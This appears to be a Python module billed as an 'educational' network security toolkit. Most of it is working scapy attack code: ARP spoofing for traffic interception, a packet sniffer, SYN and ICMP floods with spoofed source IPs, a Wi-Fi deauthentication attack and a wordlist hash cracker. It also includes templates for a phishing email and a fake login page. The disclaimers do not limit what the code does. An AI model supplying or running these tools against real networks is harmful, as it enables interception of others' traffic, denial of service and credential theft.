#!/usr/bin/env python3
"""
Advanced Network Security Tools - Educational Purpose Only
=========================================================

Advanced network security tools for penetration testing and security research.
Use only on systems you own or have explicit permission to test.

Author: Security Researcher
License: Educational Use Only
"""

import socket
import struct
import threading
import time
import random
import hashlib
import base64
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether, ARP
import subprocess
import sys
import json
from datetime import datetime

class AdvancedNetworkTools:
    def __init__(self):
        self.results = []
        self.verbose = False
        
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")

class ARPSpoofing:
    """ARP Spoofing and ARP Table Manipulation"""
    
    def __init__(self, toolkit):
        self.toolkit = toolkit
        self.target_ip = None
        self.gateway_ip = None
        self.target_mac = None
        self.gateway_mac = None
        self.spoofing = False
        
    def get_mac(self, ip):
        """Get MAC address for given IP"""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
        except Exception as e:
            self.toolkit.log(f"Error getting MAC for {ip}: {e}", "ERROR")
        return None
    
    def spoof(self, target_ip, gateway_ip):
        """Start ARP spoofing"""
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            self.toolkit.log("Could not get MAC addresses", "ERROR")
            return False
        
        self.spoofing = True
        self.toolkit.log(f"Starting ARP spoofing: {target_ip} <-> {gateway_ip}")
        
        # Start spoofing threads
        target_thread = threading.Thread(target=self._spoof_target)
        gateway_thread = threading.Thread(target=self._spoof_gateway)
        
        target_thread.start()
        gateway_thread.start()
        
        return True
    
    def _spoof_target(self):
        """Spoof target with gateway MAC"""
        while self.spoofing:
            packet = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip)
            send(packet, verbose=False)
            time.sleep(2)
    
    def _spoof_gateway(self):
        """Spoof gateway with target MAC"""
        while self.spoofing:
            packet = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip)
            send(packet, verbose=False)
            time.sleep(2)
    
    def stop_spoofing(self):
        """Stop ARP spoofing and restore ARP table"""
        self.spoofing = False
        self.toolkit.log("Stopping ARP spoofing and restoring ARP table")
        
        # Restore ARP table
        if self.target_mac and self.gateway_mac:
            packet1 = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
            packet2 = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
            send(packet1, verbose=False)
            send(packet2, verbose=False)

class PacketSniffer:
    """Advanced packet sniffer with protocol analysis"""
    
    def __init__(self, toolkit):
        self.toolkit = toolkit
        self.captured_packets = []
        self.sniffing = False
        
    def start_sniffing(self, interface="eth0", filter_string="", count=0):
        """Start packet sniffing"""
        self.toolkit.log(f"Starting packet sniffing on {interface}")
        self.sniffing = True
        
        try:
            sniff(iface=interface, prn=self._packet_handler, filter=filter_string, count=count)
        except Exception as e:
            self.toolkit.log(f"Error during sniffing: {e}", "ERROR")
        finally:
            self.sniffing = False
    
    def _packet_handler(self, packet):
        """Handle captured packets"""
        packet_info = {
            'timestamp': datetime.now().isoformat(),
            'protocol': 'Unknown',
            'source': 'Unknown',
            'destination': 'Unknown',
            'size': len(packet)
        }
        
        if packet.haslayer(IP):
            ip_layer = packet[IP]
            packet_info['source'] = ip_layer.src
            packet_info['destination'] = ip_layer.dst
            packet_info['protocol'] = 'IP'
            
            if packet.haslayer(TCP):
                tcp_layer = packet[TCP]
                packet_info['protocol'] = 'TCP'
                packet_info['source_port'] = tcp_layer.sport
                packet_info['destination_port'] = tcp_layer.dport
                packet_info['flags'] = tcp_layer.flags
                
            elif packet.haslayer(UDP):
                udp_layer = packet[UDP]
                packet_info['protocol'] = 'UDP'
                packet_info['source_port'] = udp_layer.sport
                packet_info['destination_port'] = udp_layer.dport
                
            elif packet.haslayer(ICMP):
                packet_info['protocol'] = 'ICMP'
        
        self.captured_packets.append(packet_info)
        
        if self.toolkit.verbose:
            self.toolkit.log(f"Captured {packet_info['protocol']} packet: {packet_info['source']} -> {packet_info['destination']}")
    
    def save_captured_packets(self, filename="captured_packets.json"):
        """Save captured packets to file"""
        with open(filename, 'w') as f:
            json.dump(self.captured_packets, f, indent=2)
        self.toolkit.log(f"Captured {len(self.captured_packets)} packets saved to {filename}")

class NetworkStressTester:
    """Network stress testing and DoS simulation tools"""
    
    def __init__(self, toolkit):
        self.toolkit = toolkit
        self.stress_testing = False
        
    def syn_flood(self, target_ip, target_port, count=1000):
        """SYN flood attack simulation"""
        self.toolkit.log(f"Starting SYN flood simulation on {target_ip}:{target_port}")
        self.stress_testing = True
        
        for i in range(count):
            if not self.stress_testing:
                break
                
            # Create random source IP
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            
            # Create SYN packet
            packet = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
            send(packet, verbose=False)
            
            if i % 100 == 0:
                self.toolkit.log(f"Sent {i} SYN packets")
        
        self.toolkit.log("SYN flood simulation completed")
    
    def icmp_flood(self, target_ip, count=1000):
        """ICMP flood attack simulation"""
        self.toolkit.log(f"Starting ICMP flood simulation on {target_ip}")
        self.stress_testing = True
        
        for i in range(count):
            if not self.stress_testing:
                break
                
            # Create random source IP
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            
            # Create ICMP packet
            packet = IP(src=src_ip, dst=target_ip) / ICMP()
            send(packet, verbose=False)
            
            if i % 100 == 0:
                self.toolkit.log(f"Sent {i} ICMP packets")
        
        self.toolkit.log("ICMP flood simulation completed")
    
    def stop_stress_testing(self):
        """Stop stress testing"""
        self.stress_testing = False
        self.toolkit.log("Stopping stress testing")

class WirelessSecurityTools:
    """Wireless network security tools"""
    
    def __init__(self, toolkit):
        self.toolkit = toolkit
        
    def scan_wireless_networks(self):
        """Scan for wireless networks"""
        self.toolkit.log("Scanning for wireless networks")
        
        try:
            # Use iwlist to scan for networks
            result = subprocess.run(['iwlist', 'scan'], capture_output=True, text=True)
            if result.returncode == 0:
                self.toolkit.log("Wireless networks found:")
                print(result.stdout)
                return result.stdout
            else:
                self.toolkit.log("No wireless interfaces found or permission denied", "ERROR")
                return ""
        except Exception as e:
            self.toolkit.log(f"Error scanning wireless networks: {e}", "ERROR")
            return ""
    
    def deauth_attack(self, target_mac, gateway_mac, interface="wlan0", count=10):
        """Deauthentication attack simulation"""
        self.toolkit.log(f"Starting deauth attack simulation on {target_mac}")
        
        try:
            # Create deauth packet
            packet = RadioTap() / Dot11(
                type=0, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac
            ) / Dot11Deauth()
            
            for i in range(count):
                sendp(packet, iface=interface, verbose=False)
                time.sleep(0.1)
            
            self.toolkit.log("Deauth attack simulation completed")
        except Exception as e:
            self.toolkit.log(f"Error during deauth attack: {e}", "ERROR")

class CryptographyTools:
    """Cryptography and encryption tools"""
    
    def __init__(self, toolkit):
        self.toolkit = toolkit
        
    def generate_hash(self, text, algorithm="md5"):
        """Generate hash for given text"""
        if algorithm == "md5":
            return hashlib.md5(text.encode()).hexdigest()
        elif algorithm == "sha1":
            return hashlib.sha1(text.encode()).hexdigest()
        elif algorithm == "sha256":
            return hashlib.sha256(text.encode()).hexdigest()
        elif algorithm == "sha512":
            return hashlib.sha512(text.encode()).hexdigest()
        else:
            return "Unsupported algorithm"
    
    def brute_force_hash(self, target_hash, wordlist, algorithm="md5"):
        """Brute force hash using wordlist"""
        self.toolkit.log(f"Starting brute force attack on {algorithm} hash")
        
        try:
            with open(wordlist, 'r') as f:
                words = f.readlines()
            
            for word in words:
                word = word.strip()
                hash_value = self.generate_hash(word, algorithm)
                
                if hash_value == target_hash:
                    self.toolkit.log(f"Hash cracked! Password: {word}")
                    return word
                
                if self.toolkit.verbose and len(word) % 1000 == 0:
                    self.toolkit.log(f"Tried {len(word)} passwords...")
            
            self.toolkit.log("Hash not found in wordlist")
            return None
            
        except Exception as e:
            self.toolkit.log(f"Error during brute force: {e}", "ERROR")
            return None

class SocialEngineeringTools:
    """Social engineering simulation tools"""
    
    def __init__(self, toolkit):
        self.toolkit = toolkit
        
    def generate_phishing_email(self, target_email, company_name="Example Corp"):
        """Generate phishing email template"""
        template = f"""
Subject: Urgent: {company_name} Security Update Required

Dear Valued Customer,

We have detected suspicious activity on your {company_name} account. 
To secure your account, please click the link below and update your information immediately.

[Fake Link: http://fake-security-update.com/login]

This is urgent and your account will be suspended if not completed within 24 hours.

Best regards,
{company_name} Security Team

---
WARNING: This is a simulated phishing email for educational purposes only.
Do not use this template for malicious purposes.
        """
        
        self.toolkit.log(f"Generated phishing email template for {target_email}")
        return template
    
    def create_fake_website_template(self, target_company):
        """Create fake website template for phishing simulation"""
        html_template = f"""
<!DOCTYPE html>
<html>
<head>
    <title>{target_company} - Login</title>
    <style>
        body {{ font-family: Arial, sans-serif; background-color: #f0f0f0; }}
        .login-form {{ 
            width: 300px; 
            margin: 100px auto; 
            padding: 20px; 
            background: white; 
            border-radius: 5px; 
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }}
        input {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; }}
        button {{ width: 100%; padding: 10px; background: #007bff; color: white; border: none; }}
    </style>
</head>
<body>
    <div class="login-form">
        <h2>{target_company} Login</h2>
        <form>
            <input type="text" placeholder="Username" required>
            <input type="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <p style="color: red; font-size: 12px;">
            WARNING: This is a simulated phishing page for educational purposes only.
        </p>
    </div>
</body>
</html>
        """
        
        self.toolkit.log(f"Generated fake website template for {target_company}")
        return html_template

def main():
    """Main function for advanced network tools"""
    print("=" * 60)
    print("ADVANCED NETWORK SECURITY TOOLS - EDUCATIONAL USE ONLY")
    print("=" * 60)
    print("WARNING: These tools are for educational and authorized testing only!")
    print("Unauthorized use is illegal and unethical.")
    print("=" * 60)
    
    toolkit = AdvancedNetworkTools()
    toolkit.verbose = True
    
    # Example usage (commented out for safety)
    print("\nAvailable tools:")
    print("1. ARP Spoofing")
    print("2. Packet Sniffing")
    print("3. Network Stress Testing")
    print("4. Wireless Security Tools")
    print("5. Cryptography Tools")
    print("6. Social Engineering Tools")
    
    print("\nTo use these tools, import the classes and create instances:")
    print("from advanced_network_tools import *")
    print("toolkit = AdvancedNetworkTools()")
    print("arp_spoofer = ARPSpoofing(toolkit)")
    print("# Use tools responsibly!")

if __name__ == "__main__":
    main()